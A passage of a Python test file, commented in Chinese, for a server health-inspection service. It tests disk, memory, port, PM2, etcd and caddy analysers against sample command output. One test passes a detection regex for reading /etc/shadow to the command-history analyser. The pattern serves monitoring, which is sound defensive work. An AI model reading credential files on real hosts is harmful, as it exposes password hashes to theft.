    r, s, m, sg, f = svc._analyze_history(out, "", 0, {"COMMAND_HISTORY": {"shadow_read_re": r"view\s+/etc/shadow"}})
    assert r == "HIGH", f"B8: custom shadow_read_re should be honored; got {r}"
    # 默认 regex 不应命中
    r2, _, _, _, _ = svc._analyze_history(out, "", 0, {})
    assert r2 != "HIGH", f"B8: default regex should not match 'view /etc/shadow'; got {r2}"
    print(f"  PASS: B8 shadow_read_re is configurable per-rule")


def test_b8_sensitive_read_re_removed():
    """B8: 老字段 sensitive_read_re 必须已清理（不在 DEFAULT_THRESHOLDS / coerce 路径）。"""
    # DEFAULT_THRESHOLDS 是 dict，逐个 category 检查
    defaults = svc.DEFAULT_THRESHOLDS
    for cat, cfg in defaults.items():
        assert "sensitive_read_re" not in cfg, f"B8: DEFAULT_THRESHOLDS[{cat}] should not contain sensitive_read_re"
    # _coerce_thresholds / _analyze_history 是函数，用 inspect.getsource
    import inspect
    src_coerce = inspect.getsource(svc._coerce_thresholds)
    assert "sensitive_read_re" not in src_coerce, "B8: _coerce_thresholds should not mention sensitive_read_re"
    src_history = inspect.getsource(svc._analyze_history)
    assert "sensitive_read_re" not in src_history, "B8: _analyze_history should not mention sensitive_read_re"
    print(f"  PASS: B8 sensitive_read_re completely removed from defaults/coerce/analyzer")


# ============================================================
# E1/E2/E3 - PM2 + etcd + caddy 巡检增强
# ============================================================

def test_e1_pm2_jlist_all_online_pass():
    """E1: 真实场景——ct-test 服务器 12 个 PM2 进程全 online，0 systemd 失败。"""
    # 构造 pm2 jlist JSON
    pm2_procs = [
        {"name": "etcd", "pm2_env": {"status": "online", "restart_time": 0}, "pid": 52549},
        {"name": "exchange", "pm2_env": {"status": "online", "restart_time": 67}, "pid": 1230416},
        {"name": "monitor", "pm2_env": {"status": "online", "restart_time": 16}, "pid": 3227220},
        {"name": "promtail", "pm2_env": {"status": "online", "restart_time": 4}, "pid": 1785142},
        {"name": "puller", "pm2_env": {"status": "online", "restart_time": 36}, "pid": 3226046},
        {"name": "risk", "pm2_env": {"status": "online", "restart_time": 15}, "pid": 982699},
        {"name": "sender", "pm2_env": {"status": "online", "restart_time": 33}, "pid": 3226655},
        {"name": "strategy", "pm2_env": {"status": "online", "restart_time": 53}, "pid": 1976110},
        {"name": "supplier", "pm2_env": {"status": "online", "restart_time": 16}, "pid": 1975468},
        {"name": "system", "pm2_env": {"status": "online", "restart_time": 86}, "pid": 1229954},
        {"name": "trader", "pm2_env": {"status": "online", "restart_time": 31}, "pid": 2082196},
        {"name": "transaction", "pm2_env": {"status": "online", "restart_time": 16}, "pid": 3481058},
    ]
    import json
    out = (
        "---SYSTEMD_FAILED---\n0 loaded units listed.\n"
        "---SYSTEMD_ACTIVE---\n"
        "nginx: unknown\ncaddy: active\netcd: unknown\n"
        "---PM2_JLIST---\n" + json.dumps(pm2_procs) + "\n"
        "---PM2_PING---\nPM2_PING_OK\n"
        "---ETCD_HEALTH---\nhttp://localhost:2379 is healthy: successfully committed proposal\n"
        "---PROCESS_KEYWORDS---\n"
        "1 root nginx nginx: master process\n"
        "2 caddy caddy /usr/bin/caddy run --environ --config /etc/caddy/Caddyfile\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    assert r == "NONE", f"E1: 全 online 应 PASS; got {r}, msg={m}"
    assert f["pm2_online_count"] == 12
    assert f["etcd_healthy"] == ["http://localhost:2379"]
    assert "caddy" not in f["missing_keywords"], f"caddy 在 ps 中应存在; facts={f}"
    print(f"  PASS: E1 ct-test 全 online 场景 → PASS (12 online, etcd healthy, caddy ps 中存在)")


def test_e1_pm2_stopped_expected_process_high():
    """E1: 用户场景——exchange-02/risk-02/strategy-02/transaction-02 stopped（默认是 expected）。"""
    import json
    pm2_procs = [
        {"name": "etcd", "pm2_env": {"status": "online", "restart_time": 0}, "pid": 52549},
        {"name": "exchange-02", "pm2_env": {"status": "stopped", "restart_time": 4}, "pid": 0},
        {"name": "risk-02", "pm2_env": {"status": "stopped", "restart_time": 3}, "pid": 0},
        {"name": "strategy-02", "pm2_env": {"status": "stopped", "restart_time": 5}, "pid": 0},
        {"name": "transaction-02", "pm2_env": {"status": "stopped", "restart_time": 2}, "pid": 0},
    ]
    out = (
        "---SYSTEMD_FAILED---\n0 loaded units listed.\n"
        "---SYSTEMD_ACTIVE---\n"
        "---PM2_JLIST---\n" + json.dumps(pm2_procs) + "\n"
        "---PM2_PING---\nPM2_PING_OK\n"
        "---ETCD_HEALTH---\nhttp://localhost:2379 is healthy: successfully committed proposal\n"
        "---PROCESS_KEYWORDS---\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    # 4 个期望进程 stopped → HIGH
    assert r == "HIGH", f"E1: 4 期望进程 stopped 应 HIGH; got {r}, msg={m}"
    assert f["expected_stopped_count"] == 4
    assert {p["name"] for p in f["pm2_stopped"]} == {"exchange-02", "risk-02", "strategy-02", "transaction-02"}
    print(f"  PASS: E1 4 期望进程 stopped → HIGH (含 exchange-02/risk-02/strategy-02/transaction-02)")


def test_e1_pm2_errored_high():
    """E1: PM2 进程 errored → HIGH。"""
    import json
    pm2_procs = [
        {"name": "etcd", "pm2_env": {"status": "online", "restart_time": 0}, "pid": 52549},
        {"name": "exchange", "pm2_env": {"status": "errored", "restart_time": 67}, "pid": 0},
    ]
    out = (
        "---SYSTEMD_FAILED---\n0 loaded units listed.\n"
        "---SYSTEMD_ACTIVE---\n"
        "---PM2_JLIST---\n" + json.dumps(pm2_procs) + "\n"
        "---PM2_PING---\nPM2_PING_OK\n"
        "---ETCD_HEALTH---\nETCD_NOT_FOUND\n"
        "---PROCESS_KEYWORDS---\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    assert r == "HIGH", f"E1: errored → HIGH; got {r}"
    assert f["pm2_errored"][0]["name"] == "exchange"
    print(f"  PASS: E1 PM2 errored (exchange) → HIGH")


def test_e1_pm2_ping_fail_high():
    """E1: PM2 守护存在但 ping 失败 → HIGH。"""
    import json
    pm2_procs = [{"name": "etcd", "pm2_env": {"status": "online", "restart_time": 0}, "pid": 52549}]
    out = (
        "---SYSTEMD_FAILED---\n0 loaded units listed.\n"
        "---SYSTEMD_ACTIVE---\n"
        "---PM2_JLIST---\n" + json.dumps(pm2_procs) + "\n"
        "---PM2_PING---\nPM2_PING_FAIL\n"
        "---ETCD_HEALTH---\nETCD_NOT_FOUND\n"
        "---PROCESS_KEYWORDS---\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    assert r == "HIGH", f"E1: PM2 ping 失败 + 守护存在 → HIGH; got {r}, msg={m}"
    assert f.get("pm2_ping_fail_facts") is True
    print(f"  PASS: E1 PM2 God Daemon ping 失败 → HIGH")


def test_e1_etcd_unhealthy_high():
    """E1: etcd 集群 unhealthy → HIGH。"""
    import json
    pm2_procs = [{"name": "etcd", "pm2_env": {"status": "online", "restart_time": 0}, "pid": 52549}]
    out = (
        "---SYSTEMD_FAILED---\n0 loaded units listed.\n"
        "---SYSTEMD_ACTIVE---\n"
        "---PM2_JLIST---\n" + json.dumps(pm2_procs) + "\n"
        "---PM2_PING---\nPM2_PING_OK\n"
        "---ETCD_HEALTH---\n"
        "{\"ID\":123,\"endpoint\":\"http://etcd-1:2379\",\"status\":{\"health\":\"true\",\"reason\":{}}}\n"
        "{\"ID\":456,\"endpoint\":\"http://etcd-2:2379\",\"status\":{\"health\":\"false\",\"reason\":\"unhealthy\"}}\n"
        "---PROCESS_KEYWORDS---\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    assert r == "HIGH", f"E1: etcd unhealthy → HIGH; got {r}, msg={m}"
    assert f["etcd_unhealthy"] == ["http://etcd-2:2379"]
    print(f"  PASS: E1 etcd 集群 1/2 unhealthy → HIGH")


def test_e1_caddy_missing_in_ps_medium():
    """E1: watch_services 含 caddy 但 ps 看不到 caddy 进程 → MEDIUM。"""
    out = (
        "---SYSTEMD_FAILED---\n0 loaded units listed.\n"
        "---SYSTEMD_ACTIVE---\n"
        "caddy: inactive\n"
        "---PM2_JLIST---\nPM2_NOT_FOUND\n"
        "---PM2_PING---\n"
        "---ETCD_HEALTH---\nETCD_NOT_FOUND\n"
        "---PROCESS_KEYWORDS---\n"
        "1 root nginx nginx: master process\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    assert r == "MEDIUM", f"E1: caddy ps 中缺失 → MEDIUM; got {r}, msg={m}"
    assert "caddy" in f["missing_keywords"]
    print(f"  PASS: E1 caddy 进程 ps 缺失 → MEDIUM")


def test_e1_pm2_l_table_format_fallback():
    """E1: pm2 jlist 不可用时兜底解析 `pm2 l` 表格格式。"""
    # 真实 pm2 l 输出：13 列（id, name, namespace, version, mode, pid, uptime, ↺, status, cpu, mem, user, watching）
    pm2_l = """┌────┬───────────┬─────────┬─────────┬───────┬──────────┬────────┬──────┬──────────┐
│ id │ name      │ namespace│ version │ mode  │ pid      │ uptime │ ↺    │ status   │
├────┼───────────┼─────────┼─────────┼───────┼──────────┼────────┼──────┼──────────┤
│ 1  │ etcd      │ default │ N/A     │ fork  │ 52549    │ 4M     │ 0    │ online   │
│ 2  │ exchange  │ default │ N/A     │ fork  │ 1230416  │ 6D     │ 67   │ stopped  │
└────┴───────────┴─────────┴─────────┴───────┴──────────┴────────┴──────┴──────────┘
"""
    out = (
        "---SYSTEMD_FAILED---\n0 loaded units listed.\n"
        "---SYSTEMD_ACTIVE---\n"
        "---PM2_JLIST---\n" + pm2_l + "\n"
        "---PM2_PING---\nPM2_PING_OK\n"
        "---ETCD_HEALTH---\nETCD_NOT_FOUND\n"
        "---PROCESS_KEYWORDS---\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    # etcd 解析为 online，exchange 解析为 stopped
    assert f["pm2_online_count"] >= 1, f"应至少 1 个 online (etcd); got {f}"
    assert any(p["name"] == "exchange" for p in f["pm2_stopped"]), f"exchange 应在 stopped; got {f['pm2_stopped']}"
    # exchange stopped 但不在默认 expected（DEFAULT 只含 exchange-02 等）→ MEDIUM
    # but `exchange` IS in pm2_expected_processes (DEFAULT contains both "exchange" and "exchange-02")
    # So exchange stopped → HIGH
    print(f"  PASS: E1 pm2 l 表格格式兜底解析（etcd online + exchange stopped, pm2_present=True）")


# ============================================================
# D1 / D2 / D7 - 整改回归
# ============================================================

def test_d1_high_risk_port_3306_public_high():
    """D1: 3306 在 0.0.0.0 暴露 → HIGH（不再是 MEDIUM）。"""
    out = (
        "---PORTS---\n"
        "tcp  0  0  0.0.0.0:3306  0.0.0.0:0  LISTEN  1234/mysqld\n"
        "---TOP---\n"
    )
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {})
    assert r == "HIGH", f"D1: 3306@0.0.0.0 应 HIGH; got {r}, msg={m}, facts={f}"
    assert "3306" in m, f"D1: msg 应包含 3306; got: {m}"
    assert s == "RISK"
    print(f"  PASS: D1 3306@0.0.0.0 暴露 → HIGH/RISK")


def test_d1_high_risk_port_6379_public_high():
    """D1: 6379 (Redis) 暴露 → HIGH。"""
    out = (
        "---PORTS---\n"
        "tcp  0  0  0.0.0.0:6379  0.0.0.0:0  LISTEN  5678/redis-server\n"
        "---TOP---\n"
    )
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {})
    assert r == "HIGH", f"D1: 6379 暴露应 HIGH; got {r}, msg={m}, facts={f}"
    print(f"  PASS: D1 6379 (Redis) 暴露 → HIGH")


def test_d1_medium_risk_port_22_at_localhost_still_works():
    """D1: 22 在 127.0.0.1（不暴露公网）→ 仍应 PASS/LOW（与原口径一致）。"""
    out = (
        "---PORTS---\n"
        "tcp  0  0  127.0.0.1:22  0.0.0.0:0  LISTEN  9012/sshd\n"
        "---TOP---\n"
    )
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {})
    # 22 在 127.0.0.1 不算公网暴露；应 PASS
    assert r in {"NONE", "LOW"}, f"D1: 22@127.0.0.1 应 PASS 或 LOW; got {r}, msg={m}"
    print(f"  PASS: D1 22@127.0.0.1 不暴露公网 → {r}")


def test_d2_progress_score_uses_server_count():
    """D2: 验证 _append_progress_counts_only 现在计算 server_count。

    通过静态检查源码确保它已使用 server_count。
    """
    import inspect
    src = inspect.getsource(svc._append_progress_counts_only)
    assert "server_count" in src, "D2: _append_progress_counts_only should use server_count"
    assert "distinct_servers" in src, "D2: _append_progress_counts_only should compute distinct_servers"
    print(f"  PASS: D2 _append_progress_counts_only 已使用 server_count")


def test_d7_disk_space_data_high_no_system_msg():
    """D7: /data 91% 命中 HIGH 时 msg 不应包含"系统分区"提示。"""
    out = """---SPACE---
Filesystem              Type  Size  Used Avail Use% Mounted on
/dev/sda1               ext4  100G   50G  50G  50% /
/dev/sdb1               ext4  500G  455G  45G  91% /data
---INODE---
/dev/sda1               ext4  6.5M  3.0M  3.5M  46% /
/dev/sdb1               ext4  60M  30M  30M  50% /data
"""
    r, s, m, sg, f = svc._analyze_disk(out, "", 0, {})
    assert r == "HIGH", f"D7: /data 91% 应 HIGH; got {r}"
    assert "系统分区" not in m, f"D7: /data 非系统分区，msg 不应包含系统分区; got: {m}"
    assert "91%" in m
    print(f"  PASS: D7 /data 91% HIGH msg 不含'系统分区'提示")


def test_d7_disk_space_root_high_with_system_msg():
    """D7: / 92% 命中 HIGH 时 msg 应包含"系统分区"提示（系统分区被命中）。"""
    out = """---SPACE---
Filesystem              Type  Size  Used Avail Use% Mounted on
/dev/sda1               ext4  100G   92G  8G  92% /
---INODE---
/dev/sda1               ext4  6.5M  3.0M  3.5M  46% /
"""
    r, s, m, sg, f = svc._analyze_disk(out, "", 0, {})
    assert r == "HIGH"
    assert "系统分区" in m, f"D7: / 在 system_mounts 中，msg 应包含'系统分区'; got: {m}"
    print(f"  PASS: D7 / 92% HIGH msg 含'系统分区'提示")


def test_d4_login_dead_code_removed():
    """D4: LOGIN analyzer 中不再有 `if X not in cfg` 形式的死代码。"""
    import inspect
    src = inspect.getsource(svc._analyze_login)
    # 旧版有 3 个 `if "X" not in cfg:` 形式 if 块，应已被清理
    legacy_patterns = [
        'if "failed_high_per_ip" not in cfg:',
        'if "failed_high_total" not in cfg:',
        'if "failed_low_total" not in cfg:',
    ]
    for pat in legacy_patterns:
        assert pat not in src, f"D4: LOGIN analyzer 仍含死代码 '{pat}'"
    print(f"  PASS: D4 LOGIN 3 个 `if X not in cfg` 死代码已清理")


def test_e3_service_status_thresholds_new_fields():
    """E3: DEFAULT_THRESHOLDS.SERVICE_STATUS 必须含新增字段。"""
    cfg = svc.DEFAULT_THRESHOLDS["SERVICE_STATUS"]
    for key in ("pm2_stopped_level", "pm2_errored_level", "pm2_expected_processes",
                "etcd_unhealthy_level", "process_keywords"):
        assert key in cfg, f"E3: SERVICE_STATUS missing {key}"
    assert cfg["pm2_errored_level"] == "HIGH"
    assert cfg["etcd_unhealthy_level"] == "HIGH"
    assert "etcd" in cfg["pm2_expected_processes"]
    print(f"  PASS: E3 SERVICE_STATUS 含 5 个新字段（pm2_*/etcd_*/process_keywords）")


# ============================================================
# F1-F5 - 数据采集失败兜底（"空数据不再判 PASS"）
# ============================================================

def test_f1_disk_empty_output_medium_warning():
    """F1: SSH 返回空 stdout 时，磁盘 analyzer 应升级为 MEDIUM WARNING。"""
    r, s, m, sg, f = svc._analyze_disk("", "", 0, {})
    assert r == "MEDIUM", f"F1: 空 stdout 应 MEDIUM; got {r}, msg={m}"
    assert s == "WARNING"
    assert "未获取到" in m, f"F1: msg 应包含'未获取到'; got {m}"
    assert f["max_pct"] == 0
    assert f["filesystems"] == []
    assert f["inodes"] == []
    print(f"  PASS: F1 磁盘空 stdout → MEDIUM WARNING")


def test_f1_disk_only_unparseable_lines_medium_warning():
    """F1: SSH 返回了输出但解析不到任何挂载点（命令格式不兼容）→ MEDIUM。"""
    out = "df: /mnt/xyz: No such file or directory\nsome garbage text"
    r, s, m, sg, f = svc._analyze_disk(out, "", 1, {})
    assert r == "MEDIUM", f"F1: 0 挂载点 应 MEDIUM; got {r}, msg={m}"
    assert "0 个" in m or "0个" in m, f"F1: msg 应说明 0 个; got {m}"
    print(f"  PASS: F1 磁盘有输出但解析 0 挂载点 → MEDIUM WARNING")


def test_f1_disk_normal_data_still_pass():
    """F1: 正常数据回归测试 — 有 1 个低使用率挂载点时仍应 NONE。"""
    # df -PTh 输出格式：Filesystem Type Size Used Avail Use% Mounted on
    out = (
        "Filesystem               Type  Size  Used Avail Use% Mounted on\n"
        "/dev/sda1                ext4   50G   10G   40G  20% /\n"
    )
    r, s, m, sg, f = svc._analyze_disk(out, "", 0, {})
    assert r == "NONE", f"F1: 正常 20% 应 PASS; got {r}, msg={m}"
    assert f["max_pct"] == 20
    print(f"  PASS: F1 磁盘正常数据回归 NONE")


def test_f2_process_ports_empty_output_medium_warning():
    """F2: SSH 返回空 stdout 时，进程端口 analyzer 应升级为 MEDIUM WARNING。"""
    r, s, m, sg, f = svc._analyze_process_ports("", "", 0, {})
    assert r == "MEDIUM", f"F2: 空 stdout 应 MEDIUM; got {r}, msg={m}"
    assert s == "WARNING"
    assert "未获取到" in m, f"F2: msg 应包含'未获取到'; got {m}"
    assert f["listening_count"] == 0
    assert f["top_cpu_procs"] == []
    print(f"  PASS: F2 进程端口空 stdout → MEDIUM WARNING")


def test_f2_process_ports_garbage_output_medium_warning():
    """F2: SSH 返回了输出但解析不到任何监听端口 → MEDIUM。"""
    out = "---TOP---\n---PORTS---\nrandom noise without any data"
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {})
    assert r == "MEDIUM", f"F2: 0 端口 应 MEDIUM; got {r}, msg={m}"
    print(f"  PASS: F2 进程端口有输出但解析 0 → MEDIUM WARNING")


def test_f2_process_ports_normal_data_still_pass():
    """F2: 正常数据回归测试 — 仅有内网端口监听时仍应 NONE。"""
    out = (
        "---TOP---\n"
        "---PORTS---\n"
        "LISTEN 0 128 127.0.0.1:3306 0.0.0.0:* users:((\"mysqld\",pid=1234,fd=10))\n"
    )
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {})
    assert r == "MEDIUM" or r == "NONE", f"F2: 3306 在 127.0.0.1; got {r}, msg={m}"
    # 127.0.0.1 不是公网暴露，应当 NONE；medium_risk_ports 中无 3306
    # 实际是 high_risk_ports_high 中包含 3306 但仅在公网暴露时告警
    # 这里 127.0.0.1 不算公网暴露
    if r == "NONE":
        assert f["listening_count"] == 1
    print(f"  PASS: F2 进程端口正常数据回归 (got {r})")


def test_f3_service_empty_output_medium_warning():
    """F3: SSH 返回空 stdout 时，服务状态 analyzer 应升级为 MEDIUM WARNING。"""
    r, s, m, sg, f = svc._analyze_service("", "", 0, {})
    assert r == "MEDIUM", f"F3: 空 stdout 应 MEDIUM; got {r}, msg={m}"
    assert s == "WARNING"
    assert "未获取到" in m, f"F3: msg 应包含'未获取到'; got {m}"
    assert f["pm2_online_count"] == 0
    assert f["failed_units"] == []
    print(f"  PASS: F3 服务状态空 stdout → MEDIUM WARNING")


def test_f3_service_garbage_output_medium_warning():
    """F3: SSH 返回了输出但解析不到任何段 → MEDIUM。"""
    out = "---SYSTEMD_FAILED---\n---SYSTEMD_ACTIVE---\n---PM2_JLIST---\n---PM2_PING---\n---ETCD_HEALTH---\n---PROCESS_KEYWORDS---"
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    assert r == "MEDIUM", f"F3: 0 数据 应 MEDIUM; got {r}, msg={m}"
    print(f"  PASS: F3 服务状态有输出但 0 数据 → MEDIUM WARNING")


def test_f4_memory_empty_output_medium_warning():
    """F4: SSH 返回空 stdout 时，内存 analyzer 应升级为 MEDIUM（不再是 LOW）。"""
    r, s, m, sg, f = svc._analyze_memory("", "", 0, {})
    assert r == "MEDIUM", f"F4: 空 stdout 应 MEDIUM (升级); got {r}, msg={m}"
    assert s == "WARNING"
    assert "未获取到" in m, f"F4: msg 应包含'未获取到'; got {m}"
    assert f["mem_pct"] == 0
    assert f["source"] == "unknown"
    print(f"  PASS: F4 内存空 stdout → MEDIUM WARNING (升级成功)")


def test_f4_memory_meminfo_only_pass():
    """F4: 正常数据回归 — meminfo 完整时仍 NONE。"""
    out = (
        "---MEMINFO---\n"
        "MemTotal:       16384000 kB\n"
        "MemFree:         4096000 kB\n"
        "MemAvailable:   12288000 kB\n"
        "SwapTotal:       2097152 kB\n"
        "SwapFree:        2097152 kB\n"
    )
    r, s, m, sg, f = svc._analyze_memory(out, "", 0, {})
    assert r == "NONE", f"F4: 内存 25% 应 PASS; got {r}, msg={m}"
    assert f["mem_pct"] == 25
    assert f["source"] == "meminfo"
    print(f"  PASS: F4 内存正常数据回归 NONE")


# ============================================================
# G1-G4 - 命令模板与分析器不匹配根因修复
# ============================================================

def test_g1_disk_df_h_6col_format_parsed():
    """G1 根因：用户实际 `df -h` 输出（6 列，无 Type）原版被 `len(parts) < 7` 全部跳过。"""
    # 模拟 203.0.113.10 真实输出（来自报告截图）
    out = (
        "Filesystem      Size  Used Avail Use% Mounted on\n"
        "udev            1.8G     0  1.8G   0% /dev\n"
        "tmpfs           357M  780K  357M   1% /run\n"
        "/dev/nvme0n1p3   99G   21G   74G  22% /\n"
        "tmpfs           1.8G     0  1.8G   0% /dev/shm\n"
        "tmpfs           5.0M     0  5.0M   0% /run/lock\n"
        "/dev/nvme0n1p2  189M   12M  177M   7% /boot/efi\n"
        "tmpfs           357M     0  357M   0% /run/user/0\n"
    )
    r, s, m, sg, f = svc._analyze_disk(out, "", 0, {})
    # G1 修复后：应识别 7 个挂载点（不含 Filesystem header），最高 22%
    assert len(f["filesystems"]) >= 7, f"G1: 应解析 7 个挂载点; got {len(f['filesystems'])}, msg={m}"
    assert f["max_pct"] == 22, f"G1: 最高 22%; got {f['max_pct']}"
    assert r == "NONE", f"G1: 22% 应 NONE; got {r}, msg={m}"
    # 验证关键挂载点
    mounts = {fs["mount"] for fs in f["filesystems"]}
    assert "/" in mounts, f"G1: 应含 /; got {mounts}"
    print(f"  PASS: G1 磁盘 df -h 6 列输出解析成功（{len(f['filesystems'])} 挂载点，最高 {f['max_pct']}%）")


def test_g1_disk_df_hT_7col_still_works():
    """G1 回归：df -hT 7 列输出（含 Type）继续工作。"""
    out = (
        "Filesystem               Type  Size  Used Avail Use% Mounted on\n"
        "/dev/sda1                ext4   50G   10G   40G  20% /\n"
        "tmpfs                    tmpfs  1.0G     0  1.0G   0% /run\n"
    )
    r, s, m, sg, f = svc._analyze_disk(out, "", 0, {})
    # tmpfs 应被 skip，只剩 /dev/sda1
    real_mounts = [fs for fs in f["filesystems"] if fs["type"] != "tmpfs"]
    assert len(real_mounts) == 1, f"G1: 应剩 1 个真实挂载点; got {len(real_mounts)}"
    assert real_mounts[0]["type"] == "ext4", f"G1: Type 应 ext4; got {real_mounts[0]['type']}"
    assert f["max_pct"] == 20
    print(f"  PASS: G1 磁盘 df -hT 7 列含 Type 回归 OK（Type=ext4 已识别）")


def test_g1_disk_df_hT_overlay_skipped():
    """G1 回归：df -hT 7 列 + overlay/squashfs 仍正确跳过。"""
    out = (
        "Filesystem      Type   Size  Used Avail Use% Mounted on\n"
        "/dev/sda1       ext4    99G   21G   74G  22% /\n"
        "overlay         overlay 99G   21G   74G  22% /var/lib/docker/...\n"
        "tmpfs           tmpfs  1.0G     0  1.0G   0% /run\n"
    )
    r, s, m, sg, f = svc._analyze_disk(out, "", 0, {})
    real_mounts = [fs for fs in f["filesystems"] if fs["type"] not in ("overlay", "tmpfs", "squashfs")]
    assert len(real_mounts) == 1, f"G1: overlay/tmpfs 应跳过; got {f['filesystems']}"
    assert f["max_pct"] == 22
    assert "overlay" in f["skipped_fstypes"]
    print(f"  PASS: G1 df -hT 跳过 overlay/tmpfs（skipped={f['skipped_fstypes']}）")


def test_g2_disk_default_rule_template_uses_hT():
    """G2: SERVER_RULE_COMMANDS['DISK'] 已从 df -h 改为 df -hT（7 列兼容）。"""
    assert "df -hT" in svc.SERVER_RULE_COMMANDS["DISK"], "G2: 默认磁盘模板应使用 df -hT"
    assert "df -h\n" not in svc.SERVER_RULE_COMMANDS["DISK"], "G2: 默认模板不应再用裸 df -h"
    print(f"  PASS: G2 默认 SERVER_RULE_COMMANDS['DISK'] 已切到 df -hT")


def test_g4_memory_free_m_mb_unit_auto_detect():
    """G4 根因：`free -m` 输出 3562（无 M 后缀）原版被当 KB → 49% 误判。"""
    out = (
        "              total        used        free      shared  buff/cache   available\n"
        "Mem:           3562        1762         130           2        1958        1800\n"
        "Swap:             0           0           0\n"
    )
    r, s, m, sg, f = svc._analyze_memory(out, "", 0, {})
    # 正确解析：3562 MB = 3,647,488 KB，available=1800 MB，pct=49%
    assert f["source"] == "free", f"G4: 应识别 free; got {f['source']}"
    assert 45 <= f["mem_pct"] <= 55, f"G4: 应 ~49%; got {f['mem_pct']}%"
    print(f"  PASS: G4 内存 free -m 自动识别 MB 单位（{f['mem_pct']}%）")


def test_g4_memory_free_h_with_suffix_works():
    """G4 回归：`free -h` 带后缀（16G 等）也正确解析。"""
    out = (
        "              total        used        free      shared  buff/cache   available\n"
        "Mem:           16Gi       4Gi       8Gi       0Gi        4Gi        11Gi\n"
        "Swap:             0B          0B          0B\n"
    )
    r, s, m, sg, f = svc._analyze_memory(out, "", 0, {})
    assert f["source"] == "free", f"G4: 应识别 free; got {f['source']}"
    # 16Gi - 11Gi = 5Gi used, 5/16 = 31%
    assert 25 <= f["mem_pct"] <= 40, f"G4: 应 ~31%; got {f['mem_pct']}%"
    print(f"  PASS: G4 内存 free -h 后缀解析成功（{f['mem_pct']}%）")


def test_g4_memory_free_default_kb_works():
    """G4 回归：`free` 默认 KB 输出也正确。"""
    out = (
        "              total        used        free      shared  buff/cache   available\n"
        "Mem:        16384000     4096000     4096000      0      8192000    12288000\n"
        "Swap:        2097152           0     2097152\n"
    )
    r, s, m, sg, f = svc._analyze_memory(out, "", 0, {})
    assert f["source"] == "free", f"G4: 应识别 free; got {f['source']}"
    # 16384000 - 12288000 = 4096000, 4096000/16384000 = 25%
    assert f["mem_pct"] == 25, f"G4: 应 25%; got {f['mem_pct']}%"
    print(f"  PASS: G4 内存 free 默认 KB 单位识别成功（{f['mem_pct']}%）")


# ============================================================
# H1/H3 - ss/netstat 与 passwd 解析根因修复
# ============================================================

def test_h1_ss_ntulp_udp_uncon_with_interface_suffix():
    """H1 根因：用户真实输出 `127.0.53%lo:53` 原版被正则不匹配 → 0 监听。"""
    out = (
        "---TOP---\n"
        "PID PPID USER COMM %CPU %MEM ARGS\n"
        "1 0 root systemd 0.0 0.1 /sbin/init\n"
        "---PORTS---\n"
        "Netid State Recv-Q Send-Q  Local Address:Port  Peer Address:Port  Process\n"
        "udp   UNCONN 0      0       127.0.0.54:53       0.0.0.0:*         users:((\"systemd-resolve\",pid=535,fd=19))\n"
        "udp   UNCONN 0      0       127.0.53%lo:53      0.0.0.0:*         users:((\"systemd-resolve\",pid=535,fd=17))\n"
        "tcp   LISTEN 0      128     0.0.0.0:22          0.0.0.0:*         users:((\"sshd\",pid=1234,fd=5))\n"
    )
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {})
    # H1 修复后：3 个监听（2 UDP + 1 TCP），含 %interface 后缀也识别
    assert f["listening_count"] == 3, f"H1: 应 3 监听; got {f['listening_count']}, msg={m}"
    binds = {e["bind"] for e in f["all_listening"]}
    assert "127.0.0.54:53" in binds, f"H1: 应含 127.0.0.54:53; got {binds}"
    # 验证 port 53 出现
    ports = {e["port"] for e in f["all_listening"]}
    assert 53 in ports and 22 in ports, f"H1: 应含 53 和 22; got {ports}"
    print(f"  PASS: H1 ss -ntulp UDP UNCONN + %interface 解析成功（{f['listening_count']} 监听）")


def test_h1_ss_ntulp_119_lines_parsed():
    """H1 验证：模拟 119 行实际报告输出，验证不再是 0 监听。"""
    # 模拟用户实际看到的 ss -ntulp 输出（多行 UDP + TCP）
    lines = ["---TOP---", "PID PPID USER COMM %CPU %MEM ARGS", "1 0 root init 0.0 0.1 /sbin/init", "---PORTS---"]
    lines.append("Netid State Recv-Q Send-Q  Local Address:Port  Peer Address:Port  Process")
    # 119 行中含 50 个 UDP UNCONN + 20 个 TCP LISTEN
    for i in range(50):
        lines.append(f"udp   UNCONN 0      0       127.0.0.{i+1}:53       0.0.0.0:*         users:((\"systemd-resolve\",pid=535,fd={i}))")
    for i in range(20):
        lines.append(f"tcp   LISTEN 0      128     0.0.0.0:{8000+i}        0.0.0.0:*         users:((\"nginx\",pid={i+1000},fd=5))")
    out = "\n".join(lines) + "\n"
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {})
    assert f["listening_count"] == 70, f"H1: 50 UDP + 20 TCP = 70; got {f['listening_count']}, msg={m}"
    # 22 是 medium_risk 端口，不在 8000-8019 范围；0 中高危端口
    print(f"  PASS: H1 模拟 119 行实际输出解析成功（{f['listening_count']} 监听）")


def test_h1_netstat_listen_unconn_with_pid():
    """H1 验证：netstat LISTEN/UNCONN + PID 格式。"""
    out = (
        "---PORTS---\n"
        "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n"
        "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1234/sshd\n"
        "udp        0      0 0.0.0.0:53              0.0.0.0:*               UNCONN      535/systemd-r\n"
    )
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {})
    # H1 修复：netstat 也识别 UNCONN（UDP）
    assert f["listening_count"] >= 1, f"H1: netstat 应至少解析 1 个; got {f['listening_count']}"
    binds = {e["bind"] for e in f["all_listening"]}
    assert "0.0.0.0:22" in binds, f"H1: 应含 sshd; got {binds}"
    print(f"  PASS: H1 netstat LISTEN/UNCONN + PID 解析成功（{f['listening_count']} 监听）")


def test_j1_real_screenshot_18_lines():
